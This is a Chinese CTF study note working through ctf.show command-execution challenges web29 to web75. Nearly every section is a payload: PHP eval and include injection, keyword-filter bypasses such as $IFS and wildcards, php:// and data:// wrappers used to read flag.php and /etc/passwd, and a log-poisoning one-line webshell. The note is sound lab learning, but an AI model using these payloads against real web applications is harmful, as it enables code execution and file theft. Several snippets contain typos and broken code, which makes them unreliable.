#CTF-命令执行
# web29：过滤flag\i
```
?c=phpinfo();
?c=phpinfo()?>    //如果过滤;，可以用?>闭合php代码，实现代码执行

?c=system('ls');    //查看当前文件
?c=file_get_contens("文件名”)；    //如果知道具体文件名可以使用

?c=system("cp fla?.php 1.txt");    //将fla?.php文件复制成1.txt，绕过flag关键词
之后访问1.txt文件即可
```

# web30: 过滤/flag|system|php/i
```
?c=`cp fla?.??? 1.txt`;    //`在php中和system一样，表示需要执行，用？来绕过php关键词，最后访问1.txt即可
```

# web31：过滤flag|system|php|cat | sort | shell | \. |  |\` 
```
?c=eval($_GET[1]);&1=phpinfo();    //使用eval的嵌套执行，1代表的代码被逃逸出去了那么1这里就可以随便使用被ban掉的关键词

?c=eval($_GET[1]);&1=system('cat flag.php');    //出现网页空白是因为，php文件需要查看网页源代码才能看到

?c=eval($_GET[1]);&1=system('tac flag.php');     //用tac的话就不需要查看网页源代码了
```

# web32: 过滤 flag | system | php | cat | sort | shell | . |   | \`| echo | ; 
```
方法一：使用嵌套执行即可完成逃逸

方法二：
?c=include%0a$_GET[1]?>1=/etc/passwd     //使用文件包含，进行逃逸，用?>闭合前面代码
使用插件自带的代码获取flag.php文件，令resourece=flag.php即可，拿到了base64加密后的文件，之后进行解码即可拿到flag
```
[[include用法]]
![[Pasted image 20250316172512.png|385]]

# web33:过滤 flag | system | php | cat | sort | shell | . |   | \`| echo | ; | " | 
```
前面嵌套执行均可使用
?c=require%0a$_GET[1]?>1=php://filter/convert.base64-encode/resource=flag.php
```
[[require用法]]

# web34:过滤  flag | system | php | cat | sort | shell | . |   | \`| echo | ; | " | ( | : |
```
前面的嵌套执行均可使用
不需要使用括号的语言结构：echo print isset unset include require

?c=print%0a$_GET[1]?>&1=phpinfo();   //无法执行，因为print只是打印输出一行字符串

?c=include%0a$_GET[1]?>1=php://filter/convert.base64-encode/resource=flag.php    
```
[[php语言结构]]

# web35:过滤  flag | system | php | cat | sort | shell | . |   | \` | echo | ; | " | ( | : | < | =|
多过滤了左括号和等号
```
?c=include%0a$_GET[1]?>1=php://filter/convert.base64-encode/resource=flag.php    
```
为什么只能使用这种方法呢？语言分为数据域和代码域，因为我们执行代码的函数需要用括号来表示为代码域，需要执行，但是现在括号被ban了，我们只能使用不用括号，但仍能执行代码的函数

# web36:过滤  flag | system | php | cat | sort | shell | . |   | \` | echo | ; | " | ( | : | < | =| 【0-9】|

这里多过滤了数字
```
?c=include%0a$_GET[a]?>a=php://filter/convert.base64-encode/resource=flag.php  
```

# web37:原来是eval($c)，现在是include(￥c)

区别是什么？eval是代码域，而include是数据域，这就表示我们输入的代码不能被直接执行了
考点是伪协议
```
?c=data://tetx/plain<?php phpinfo();?>     //可以成功
data://协议的特点就是将后面的字符串作为代码进行执行

?c=data://tetx/plain,<?php system("mv fla?.php 1.txt");?>   //之后访问1.txt即可
```
[[伪协议]]
# web38:include——过滤 flag| php | file 
```
?c=data://tetx/plain<?php system("mv fla?.php 1.txt");?>    //由于Php被ban导致我们这串Payload不能使用

?c=data://tetx/plain,<?=system("cp fl*.* 1.txt);?>
```
[[短标签]]

# web39:无回显，强制后缀名 include——过滤 flag| php | file 
![[Pasted image 20250316181615.png]]
```
?c=data://tetx/plain,<?=system("cp fl*.* 1.txt);?>
同样可行
```

# web40:过滤【0-9】| ~ | \` | @ | # | $ | % | ^ | & | * | ( | ) | - | = | + | { | } | ：|‘ | “ |，| < | > | / | ? |

能过滤的都过滤了，但是没有过滤下划线，没有过滤英文括号
```
show_source(next(array_reverse(scandir(pos(localeconv())))));
```
## 代码解释
这段代码是PHP代码，它使用了多个内置函数来执行一系列操作。让我们逐步解析这段代码：

1. **`localeconv()`**: 这个函数返回一个包含本地化信息的数组，例如货币符号、小数点符号等。它通常用于获取与当前区域设置相关的信息。

2. **`pos()`**: 这个函数是 `current()` 的别名，用于返回数组中的当前元素。在这个上下文中，`pos(localeconv())` 会返回 `localeconv()` 返回的数组中的第一个元素。

3. **`scandir()`**: 这个函数列出指定目录中的文件和目录。它需要一个目录路径作为参数。在这里，`scandir(pos(localeconv()))` 会尝试扫描 `localeconv()` 返回的数组的第一个元素所代表的目录。

4. **`array_reverse()`**: 这个函数将数组中的元素顺序反转。`array_reverse(scandir(pos(localeconv())))` 会将 `scandir()` 返回的数组反转。

5. **`next()`**: 这个函数将数组的内部指针向前移动一位，并返回该元素。`next(array_reverse(scandir(pos(localeconv()))))` 会返回反转后的数组中的第二个元素。

6. **`show_source()`**: 这个函数用于显示指定文件的源代码，并使用语法高亮显示。它需要一个文件名作为参数。在这里，`show_source(next(array_reverse(scandir(pos(localeconv())))))` 会尝试显示 `next()` 返回的文件名的源代码。
### 总结
这段代码的目的是：
- 获取当前区域设置的信息。
- 使用这些信息中的第一个元素作为目录路径。
- 扫描该目录并反转文件列表。
- 获取反转后的文件列表中的第二个文件。
- 显示该文件的源代码。

```
c=print_r(get_defined_vars);     //拿到当前所有的变量值，看一看有什么能用，返回的是一组数组值
c=print_r(next(get_defined_vars));     //为了拿到包含phpinfo()函数的数组值
c=print(array_pop(next(get_defined_vars)));    //从数组中弹出phpinfo（）函数
c=eval(array_pop(next(get_defined_vars)));     //执行phpinfo()

1=system(“tac fla?.php”);
```
`get_defined_vars()` 是一个 PHP 内置函数，它返回一个包含当前作用域中所有已定义变量的数组。这个数组的键是变量名，值是变量的内容。

# web41:过滤/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i

由于屏蔽了全部的字母和数字，我们需要自己拼凑出代码，考查或运算，留个脚本
[web41题解](https://blog.csdn.net/miuzzx/article/details/108569080)

# web42: shell重定向，页面上不会显示任何输出或错误信息


```
?c=ls;ls      //双写绕过，这里是因为shell内部通过;来隔离多个命令，代码阅读从右到左，shell会先执行右边的ls将其扔进黑洞，但左边的ls不会去管他

?c=tac flag.php;ls
```

# web43：shell重定向+过滤 | ：| flag | 
 
```
上题解法可行
?c=ls&&ls;     //&&相当于把命令分割，同时进行两个命令执行，黑洞只会吃第一个
?c=tac flag.php&&ls
```

# web44: shell重定向+过滤 | ：| flag | cat |

同理上题，只需要写/fla*

# web45: shell重定向+过滤 | ：| flag | cat |   |

```
?c=tac fla*.php%26%26ls    //由于空格过滤，所以改一下代码
?c=tac%09fla*.php%26%26    //成功绕过空格
```

# web46: shell重定向+过滤 |\\|;|cat|flag| |[0-9]|\\$|\*/i

过滤了星号，但是可以用?代替
```
?c=tac flag.php%26%26ls   //常规写法，空格、php都被过滤
?c=tac%09fla?.php%26%26ls
```

> [!NOTE] 为什么过滤了数字，%20这种没被过滤呢？
> 因为%20会被识别为特殊字符，而不是数字，这是一种编码形式

# web47：shell重定向+/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i

过滤了其他读命令，但tac没被过滤
```
?c=tac%09fla?.php%26%26ls
```

# web48: shell重定向+/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail| sed | cut | awk | strings | od | curl |/i

过滤了其他读命令，但tac没被过滤
```
?c=tac%09fla?.php%26%26ls
```

# web49: shell重定向+/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail| sed | cut | awk | strings | od | curl | \`| /i

多了一个分号
```
?c=tac%09fla?.php%26%26ls
```

# web50:  shell重定向+/\;|cat|flag|  |[0-9]|\\$|\*|more|less|head|sort|tail| sed | cut | awk | strings | od | curl | \`| % | x09 | x26 |/i

%被ban了，x09是\t制表符，x26是&符号，空格都被ban了。只能使用一个不带空格的命令
```
?c=nl<fla''g.php||ls     //nl是一个读取命令，会读取后面的文件内容
```
[[nl指令用法]]

# web52：shell重定向+过滤"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i

把$放出来了，可以使用复制或者重命名的方式
```
?c=cp$IFSfla?.php$IFSa.txt||ls
?c=ls||ls     //用于查看文件是否复制成功
一直没成功，要怀疑是不是没有写权限

?c=mv$IFSfla?.php$IFSa.txt||ls     //使用重命名，发现也不行

?c=mv${IFS}fla?.php${IFS}a.txt||ls     //标准空格写法，可以成功命名,访问a.txt，发现是假flag
?c=ls${IFS}/||ls     //查看根目录，发现了flag
?c=cp${IFS}/fla?{IFS}/var/www/html/b.txt||ls     //将flag文件复制到当前默认路径下，以b.txt保存，最后访问b.txt即可
```

# web53: system回显+过滤"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i


> [!NOTE] system回显的特点
> 只会返回输出结果的最后一行
```
?c=ta''c${IFS}fla?.php     //单引号绕过
```

# web54:system回显+过滤/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i",

单引号也被过滤了，但是mv指令没被过滤
```
?c=mv${IFS}fla?.php${IFS}z.txt
?c=ls
访问z.txt即可
```

# （未做出来）web55:无字母RCE：system回显+过滤
[web题解](https://blog.csdn.net/qq_46091464/article/details/108513145)
给了空格，但是没给字母，考虑无字母RCE，做一个文件上传的表单
注意事项：URL地址和enctype的类型是from-data
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

这时候我们可以在这个文件上传表单中上传文件，同时注意到题目没有过滤`.`，而这个在linux下可以当做执行文件的命令`.payload`，但是现在没有上传文件的地方，所以我们先构造了一个文件上传的表单，先存储我们的`payload`文件。由于文件上传的名字我们无法控制（题目中屏蔽了字母），所以我们采用通配符的形式`。=./tmp/payload==/???/???????`这样子达到执行文件的效果

用抓包修改包达到上述效果

# （未做出来）web56: 无字母RCE:system回显+过滤字母和数字

php上传机制，上传的文件存储在/temp文件下面，当脚本执行完毕的时候就会删除
先抓个包
![[Pasted image 20250317132139.png]]

# web57：system执行，利用$(())做数学运算

![[Pasted image 20250317134615.png]]

# web58: 命令执行，禁用函数

```
c=phpinfo();    //想查看禁用了哪些函数，结果phpinfo()被禁用了
c=system('ls');    //同样被禁用
c=echo shell_execl('ls');    //被禁
c=file_get_contents('index.php');    //读取文件没被禁用
```

# web59:命令执行，禁用函数

```
c=file_get_contents('index.php');    //被禁用

c=include($_GET[1]);      //可以使用
1=LFI(就是HACKBAR自带的读取文件的脚本)    
```

# web60:命令执行，禁用函数

```
c=include($_GET[1]);      //可以使用
1=LFI(就是HACKBAR自带的读取文件的脚本)   

方法二：一句话木马
先在name那边选择User-agent, 在value那边选择<?php eval($_POST[a]);?>，把一句话木马写入
然后
c=include($_GET[1]);&a=highlight('flag.php')  
?1=/var/log/nginx/access.log
```

# web61：命令执行，禁用函数

```
使用POST方法
c=highlight('flag.php');

c=show_source('flag.php');
```

# web62: 命令执行，禁用函数

```
使用POST方法
法一
c=highlight('flag.php');
法二
c=show_source('flag.php');
法三：
c=include('flag.php');echo $flag;    //
```
- **`include` 是 PHP 的文件包含函数**，它会将 `flag.php` 文件的内容加载到当前脚本中并执行。
- 如果 `flag.php` 中定义了全局变量 `$flag`（例如 `$flag = "flag{xxx}";`），那么通过 `include` 引入该文件后，`$flag` 会直接存在于当前脚本的全局作用域中。
- **关键点**：PHP 的文件包含相当于将代码“粘贴”到当前文件中执行，因此 `$flag` 的作用域与当前脚本一致。\
- 你的代码片段 `c=include('flag.php'); echo $flag;` 可以分解为以下步骤：
1. **执行 `include('flag.php')`**
    - 加载并执行 `flag.php`，假设该文件中定义了 `$flag` 变量。
    - `include` 的返回值通常是 `1`（表示成功包含文件），除非 `flag.php` 中显式使用 `return` 返回值（例如 `return "success";`）。
2. **将 `include` 的返回值赋给变量 `c`**
    - 如果 `flag.php` 中没有 `return` 语句，`c` 的值会是 `1`；否则会是 `flag.php` 中 `return` 的内容。
    - 但无论 `c` 的值是什么，**`flag.php` 中定义的变量 `$flag` 已经存在于当前脚本的全局作用域**。
3. **输出 `$flag`**
    - 因为 `$flag` 已经被加载到当前作用域，直接 `echo $flag` 即可输出其值。

# web63: 命令执行，禁用函数

```
使用POST方法
法一
c=highlight('flag.php');
法二
c=show_source('flag.php');
法三：
c=include('flag.php');echo $flag;  
法四：
c=include('flag.php');var_dump(get_defined_vars());    //如果知道文件名，使用include将文件加载到当前脚本的作用域中，get_defined_vars()是拿到当前作用域的所有变量
```
你的代码片段 `c=include('flag.php'); var_dump(get_defined_vars());` 可以分解为以下步骤：
1. **执行 `include('flag.php')`**
    - 加载并执行 `flag.php`，假设该文件中定义了 `$flag` 变量（例如 `$flag = "flag{xxx}";`）。
    - `include` 的返回值通常是 `1`（表示成功包含文件），除非 `flag.php` 中显式使用 `return` 返回值（例如 `return "success";`）。
2. **将 `include` 的返回值赋给变量 `c`**
    - 如果 `flag.php` 中没有 `return` 语句，`c` 的值会是 `1`；否则会是 `flag.php` 中 `return` 的内容。
3. **调用 `get_defined_vars()`**
    - 该函数会返回一个数组，包含当前作用域中所有已定义的变
	 4.**输出变量信息**
- 使用 `var_dump()` 输出 `get_defined_vars()` 的结果，显示所有变量的名称和值。

# web64: 命令执行，禁止函数

```
使用POST方法
法一
c=highlight('flag.php');
法二
c=show_source('flag.php');
法三：
c=include('flag.php');echo $flag;  
法四：
c=include('flag.php');var_dump(get_defined_vars()); 
法五；
c=rename('flag.php','1.txt')   //重命名，然后访问1，txt,可惜此题被禁用
法六：
c=print_r(scandir('.'))    //读取当前文件夹所有目录
c=show_source('flag.php');
```

# web65: 命令执行，禁止函数

```
c=show_source('flag.php');
```

# web66: 命令执行，禁止函数

```
c=highlight('flag.php');    //输出被重定向了，换一个方法
c=var_dump(scandir('.'))    //看一下当前目录，是不是flag被改地址了
c=var_dump(scandir('../'))     //看一下上一层
c=var_dump(scandir('/'))     //查看根目录，点击查看源文件发现了flag.txt
c=highlight_file('/flag.txt')    //高亮根目录下的flag文件
```

# web68:命令执行，禁止函数，hightlight_file被ban

```
方法一：使用Include
c=include('flag.php');echo $flag;     //失败
方法二：
c=print_r(scandir('/'))     //print_r被ban
方法三：
c=var_dump(scandir('/'))     //展示根目录，可以使用，发现flag.txt
c=include('/flag.txt');echo $flag;
```

# web71：命令执行，禁止函数，无报错信息

```
查看源码后的思路，在echo处直接中断代码，使得后面无报错信息失效
c=include('/flag.txt');exit();
```

# web72: 命令执行，禁止函数,无报错信息

```
c=include('/flag.txt');exit();    //报错，不支持这个文件
c=var_dump(scandir('/'));exit()    //找一下flag文件位置，var_dump被禁用
c=$a=scandir('/');exit();    //fail to open /，说明我们没有读权限

```

```
c=$a="glob:// /*.txt";     //定义一个路径，根目录下所有txt文件
	if($b=opendir($a)){     //循环读
		while($file=readdir($b)!==false){
			echo"filename:".$file."\n"
		}
		closedir($b);
	}
	exit();
成功发现flag0.txt文件

c=include("/flag0.txt");exit();     //由于flag不在根目录，失败

使用72poc绕过脚本，粘贴到body部分，记得URL编码
```
[[72poc绕过脚本]]

# web73:命令执行，禁止函数

将上题的72poc绕过脚本放入，发现其中某些函数被禁用了，重写一份payload
```
<?php
//strlen  //返回指定字符串的长度
function strlen_user($s){
	return count(str_split($s))
}
echo strlen_user('abc')
?>
```
将该函数替换掉原来的payload中的strlen函数，但是存在整数溢出的错误，需要换一份写法
```
<?php
//strlen  //返回指定字符串的长度
function strlen_user($s){
	$ret=0;
	for($i=0;$i<100000;$i++){
		if($s[$i]){
			$ret=$ret+1;
		}else{
			breark
		}
	}
}
echo strlen_user('abc')
?>
```

# web 74:命令执行，禁止函数

```
尝试发现flag位置
c=$a="glob:// /*.txt";     //定义一个路径，根目录下所有txt文件
	if($b=opendir($a)){     //循环读
		while($file=readdir($b)!==false){
			echo"filename:".$file."\n"
		}
		closedir($b);
	}
	exit();

之后使用包含即可
?c=include(flagx.txt);exit();
```

# （不理解）web75:命令执行，禁止函数，数据库查询

```
尝试发现flag位置
c=$a="glob:// /*.txt";     //定义一个路径，根目录下所有txt文件
	if($b=opendir($a)){     //循环读
		while($file=readdir($b)!==false){
			echo"filename:".$file."\n"
		}
		closedir($b);
	}
	exit();

之后使用包含即可
?c=include(flagx.txt);exit();
```
此题被Ban,报错信息open_basic

使用数据库查询
